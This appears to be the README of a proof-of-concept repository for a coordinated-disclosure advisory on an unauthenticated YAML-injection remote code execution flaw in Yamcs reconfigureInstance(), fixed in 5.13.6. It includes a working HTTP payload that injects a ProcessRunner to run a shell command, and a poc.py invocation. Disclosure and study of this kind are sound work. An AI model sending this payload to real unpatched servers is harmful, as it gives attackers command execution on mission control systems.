# Yamcs `reconfigureInstance()` YAML Injection RCE

Unauthenticated remote code execution in [Yamcs](https://github.com/yamcs/yamcs) mission
control via YAML structure injection in `reconfigureInstance()`, the sibling of the
`createInstance()` path addressed by CVE-2026-55559.

| | |
|---|---|
| Advisory | GHSA-wqq5-5w4p-m569 |
| Affected | `org.yamcs:yamcs-core` <= 5.13.5 |
| Fixed | 5.13.6 |
| Impact | RCE as the Yamcs service account, unauthenticated in the default no-`security.yaml` config |

## Bug

CVE-2026-55559 hardened `createInstance()` to use `template.processAndSanitizeYaml()`.
The same rendering in the sibling `reconfigureInstance()` (`YamcsServer.java:693`) goes
through the raw `template.process()`. A template arg rendered inside a quoted scalar, e.g.
`name: "{{ spaceSystem }}"`, can close the quote and inject a top-level `services:` key.
SnakeYAML keeps the last duplicate key, so an injected `org.yamcs.ProcessRunner` runs a
command when the instance restarts.

## PoC

One request against a templated instance. No authentication in the default config.

```http
POST /api/instances/{instance}:reconfigure
Content-Type: application/json

{"templateArgs":{"spaceSystem":"x\"\nservices:\n  - class: org.yamcs.ProcessRunner\n    args:\n      command: [\"sh\",\"-c\",\"id\"]\n#"}}
```

The instance auto-restarts and runs the command:

![poc](demo/poc-rce.gif)

## Run

```sh
python3 poc.py --url http://TARGET:8090 --create --arg 'bar=Option 2' --marker /tmp/pwn --local-check
# exit 2 = vulnerable, 0 = safe
```

## Fix

`YamcsServer.java:693`: `template.process(...)` -> `template.processAndSanitizeYaml(...)`.

## Disclosure

Coordinated disclosure, do not run it against systems you do not own.

- `2026-08-29`  Reported privately to the Yamcs maintainers
- `2026-10-01`  Fixed in Yamcs 5.13.6, advisory [GHSA-wqq5-5w4p-m569](https://github.com/yamcs/yamcs/security/advisories/GHSA-wqq5-5w4p-m569) published
- `2026-10-02`  This PoC published

## Refs

- [GHSA-wqq5-5w4p-m569](https://github.com/yamcs/yamcs/security/advisories/GHSA-wqq5-5w4p-m569) (fixed 5.13.6, commit [`04bfc74`](https://github.com/yamcs/yamcs/commit/04bfc74f9fb5))
- [CVE-2026-55559](https://nvd.nist.gov/vuln/detail/CVE-2026-55559) / [GHSA-73mf-m39p-wpm9](https://github.com/yamcs/yamcs/security/advisories/GHSA-73mf-m39p-wpm9) (original `createInstance()` fix, commit [`549f295`](https://github.com/yamcs/yamcs/commit/549f295cf8c5496a5e799d6bec2432ef976c82aa))
